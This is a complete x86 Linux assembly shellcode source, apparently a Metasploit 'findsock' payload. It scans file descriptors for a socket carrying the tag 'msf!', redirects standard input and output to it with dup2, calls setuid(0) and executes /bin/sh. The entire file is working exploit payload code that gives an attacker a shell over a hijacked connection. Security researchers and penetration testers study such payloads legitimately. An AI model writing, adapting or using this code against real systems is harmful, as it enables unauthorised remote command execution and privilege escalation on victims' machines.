BITS 32

; findsock via recv MSG_DONTWAIT by spoonm
; thanks to skape for ideas
; XXX: Push null value as first dword of recv() buffer so recv() success check can be skipped.
; XXX: Have constant sockaddr pointer and just do a 16-bit inc.
; XXX: Get rid of esi counter?
; XXX: Push return value of dup2() in loop so you can pop ebx() and also have a string terminator for '/bin/sh' on the stack as well.

; OS/CPU: linux/x86
; Total Size: 94


xor esi, esi
dec si

; esi = loop counter
multitry:

xor edx, edx
mov dx, 0x0fff

; edx = loop counter
recv_loop:

mov eax, esp
push BYTE 0x40 ; flags (MSG_DONTWAIT)
push BYTE 0x04 ; recv len (4)
push eax ; store recv'd data at end of our stack block
push edx ; socket fd
mov ecx, esp ; args ptr

push BYTE 0x0a
pop ebx ; socketcall 0x0a (recv)
push BYTE 0x66
pop eax ; syscall socketcall (0x66)
int 0x80

sub esp, BYTE -16
cmp dword [esp], 'msf!' ; check for tag
je shell

dec edx
jns recv_loop

dec esi
jns multitry

; exit
xor eax, eax
inc eax
int 0x80 ; syscall exit (1)


shell:
mov ebx, edx

; dup loop, rockin hard via skape
; socket fd in ebx
push BYTE 0x02
pop ecx ; get counter (2) in ecx
dup_loop:
push BYTE 0x3f
pop eax ; syscall 0x3f (dup2)
int 0x80
dec ecx
jns dup_loop

; setuid(0)
push BYTE 0x17
pop eax ; syscall 0x17 (setuid)
xor ebx, ebx ; uid_t 0
int 0x80

; ebx is zero here, but I
; couldn't find a way to make that help
push BYTE 0x0b
pop eax
cdq ; zero edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push edx
push ebx
mov ecx, esp
int 0x80

